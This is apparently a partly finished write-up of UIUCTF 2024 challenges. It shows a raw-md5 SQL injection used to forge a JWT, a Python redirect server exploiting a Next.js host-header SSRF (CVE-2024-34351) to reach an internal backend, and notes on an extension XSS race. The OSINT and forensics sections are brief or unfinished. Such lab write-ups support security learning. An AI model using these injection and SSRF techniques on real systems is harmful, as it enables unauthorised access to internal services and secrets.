## Fare evasion

```
Author: Louis

SIGPwny Transit Authority needs your fares, but the system is acting a tad odd. We'll let you sign your tickets this time!

https://fare-evasion.chal.uiuc.tf/
```

Once we click on the passenger button we get the following messsage:

```text

Fare Collection

A transit system as great as ours cannot run without fares. SIGPwny Transit Authority requests $2 per passenger.
Sorry passenger,only  conductors are allowed right now. Please sign your own tickets.
hashed _RòsÜxÉÄÅ´\ä secret: a_boring_passenger_signing_key_?
```


```js
async function pay() {
      // i could not get sqlite to work on the frontend :(
      /*
        db.each(`SELECT * FROM keys WHERE kid = '${md5(headerKid)}'`, (err, row) => {
        ???????
       */
      const r = await fetch("/pay", { method: "POST" });
      const j = await r.json();
      document.getElementById("alert").classList.add("opacity-100");
      // todo: convert md5 to hex string instead of latin1??
      document.getElementById("alert").innerText = j["message"];
      setTimeout(() => { document.getElementById("alert").classList.remove("opacity-100") }, 5000);
    }
```


Basically we needed to do a sql injection after the md5 hash being generated.
A friend of mine funf this link: <https://cvk.posthaven.com/sql-injection-with-raw-md5-hashes> which basically explains how dangerous md5 hash in a SQL queries is. 

On the bottom of the post there is an sql injection: `129581926211651571912466741651878684928`, using this as the kid header we get the conductor signing key: 

```text

Fare Collection

A transit system as great as ours cannot run without fares. SIGPwny Transit Authority requests $2 per passenger.
Sorry passenger, only conductors are allowed right now. Please sign your own tickets.
hashed ô÷uÞIBBçÙ+ secret: conductor_key_873affdf8cc36a592ec790fc62973d55f4bf43b321bf1ccc0514063370356d5cddb4363b4786fd072d36a25e0ab60a78b8df01bd396c7a05cccbbb3733ae3f8e
hashed _RòsÜxÉÄÅ´\ä secret: a_boring_passenger_signing_key_?
```

just change the type in the data body to conductor and sign the jwt toke with the conductor signing key:

![1719654458957](image/writepup/1719654458957.png)

And we get the flag: 

![1719654508747](image/writepup/1719654508747.png)

Final jwt token:
eyJhbGciOiJIUzI1NiIsImtpZCI6IjEyOTU4MTkyNjIxMTY1MTU3MTkxMjQ2Njc0MTY1MTg3ODY4NDkyOCIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiY29uZHVjdG9yIn0.YWplnj-iX34rGmdIICAd9aUlB_MFEpCGijRq5upkpeg

Flag: `uiuctf{sigpwny_does_not_condone_turnstile_hopping!}`


## Log Action

```
Author: Minh

I keep trying to log in, but it's not working :'(
http://log-action.challenge.uiuc.tf/
```

Basically this challenge is frontend challenge using next js in the version 14.1.0.º
This version is vulnerable to a SSRF in the host header:

- https://osv.dev/vulnerability/GHSA-fr5h-rqp8-mj6g
- https://www.cve.news/cve-2024-34351/
- https://github.com/azu/nextjs-CVE-2024-34351/tree/main

Basically we need to find a page that has a redirect. Logout page has one and we can access ti without being authenticated:

```js

import Link from "next/link";
import { redirect } from "next/navigation";
import { signOut } from "@/auth";

export default function Page() {
  return (
    <>
      <h1 className="text-2xl font-bold">Log out</h1>
      <p>Are you sure you want to log out?</p>
      <Link href="/admin">
        Go back
      </Link>
      <form
        action={async () => {
          "use server";
          await signOut({ redirect: false });
          redirect("/login");
        }}
      >
        <button type="submit">Log out</button>
      </form>
    </>
  )
}
```

With the following flask server we can get the flag which is in the backend with:

```py
from http.server import BaseHTTPRequestHandler, HTTPServer

class RedirectHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header('Location', 'http://backend/flag.txt')
        self.end_headers()
    def do_HEAD(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/x-component')
        self.end_headers()

def run(server_class=HTTPServer, handler_class=RedirectHandler, port=80):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f"Server running at http://localhost:{port}/")
    httpd.serve_forever()

if __name__ == "__main__":
    run()

```

Change the request host and origin to our domain:

![1719658813704](image/writepup/1719658813704.png)

Flag: `uiuctf{close_enough_nextjs_server_actions_welcome_back_php}`



## pwnypass

```
Author: arxenix

We're working on a cool password manager extension for SIGPwny members. Can you break it?

ncat --ssl pwnypass-bot.chal.uiuc.tf 1337
```

for flag1 we can get by xss in extension context then issue a token to get passwords on https://pwnypass.c.hc.lc/. the token then can be used to read stored password/flag1 on https://pwnypass.c.hc.lc/.
the tricky part, to issue the token, current tab origin must have target issuance origin, but here's the thing with getOrigin
// background.js
const getOrigin = async (id) => new Promise((res)=>chrome.tabs.get(id, (t)=>setTimeout(()=>res(new URL(t.pendingUrl ?? t.url).origin),200)));

we can race to get pendingUrl to our target when there's a pending navigation on current context 
for flag2 we need to gain some sort of full local file read since it's placed on /home/user/flag-randomchars/......../flag.txt. should be do able once we read chrome extension api, since we can eval on extension context using evaluate command 
will continue this later


## Chunky boi

```
Author: CBCicada, Emma

Now that's a BIG plane! I wonder where it is. Flag format: uiuctf{plane type, coordinates of the aircraft} Example: uiuctf{Airbus A380-800, 40.036, -88.264}

For coordinates, just omit the digits, do not round up. Precision is the same as the one in the example. The aircraft name is the same as Wikipedia page title. You can extract enough information from this image to answer this. You DO NOT need to register any accounts, all the information is public.

Flag format clarification: The last digit of the first coordinate is even, and the last digit of the second coordinate is odd.
``` 

Basically we need to get the location and airplane model of the following image:

![1719658813704](chal.jpg)

The model was kinda easy: `https://en.wikipedia.org/wiki/Boeing_C-17_Globemaster_III`

The problem was the location, in the image we have the date when the picture was taken from which is May 11.

Here is some tools i used:
- https://geospy.web.app/
- https://globe.adsbexchange.com/?icao=ae20c3
- https://globe.adsbexchange.com/?icao=ae20c3&lat=47.462&lon=-122.304&zoom=16.1&showTrace=2024-05-11&timestamp=1715462657


Flag: `uiuctf{Boeing C-17 Globemaster III, 47.462, -122.303}`

## New Dallas

Author: CBCicada

Super wide roads with trains... Is this the new Dallas? Flag format: uiuctf{coordinates of intersection between the rail and the road} Example: uiuctf{41.847, -87.626}

Flag format clarification: Use three decimal points of precision, truncate, and do not round. Use Google Maps location for reference. The last digit of the first cooordinate is odd, and the last digit of the second coordinate is even.


## Wild Goose Chase

Author: ronanboyarski

The threat group GREGARIOUS GOOSE has hacked into SIGPwny servers and stolen one of our flags! Can you use the evidence to recover the flag? Now with 100% more goose.

WARNING: This challenge contains malware that may read images on your hard disk. Ensure that you do not have anything sensitive present.


Using radare2 `r2 Goose.dmp` and `iSq~exe` we found a interesting executable `C:\Users\Ronan\Goose.exe`.

The pcapng image seems to have a tls traffic which way may need to decrypt:

![1719741025508](image/writepup/1719741025508.png)

It has a interesting http traffic where it downloads the Goose.exe file. Lets export objects and look at it:

![1719741244683](image/writepup/1719741244683.png)

Doing strings we get some strange functions associated with ransomware.











https://ctftime.org/event/2275
Sat, 29 June 2024, 00:00 UTC — Mon, 01 July 2024, 00:00 UTC
Here, another weekend another CTF 👀
team invite: https://2024.uiuc.tf/login?token=fPRRxgpNirnvgf2gWtnupgxCCsGuNCnVHdY4uq0M21fgaoG6C8pN7WG7OmtrDv3DnzM7Ffv3aPFXKYxGLm9cFoqgQt2QWt8O0qnFxgLxofzdCUMwY4hzh0nCF%2B1W
WU notion: https://www.notion.so/invite/608f761f677f9ce160cc886d90c5ba26e6b01ca6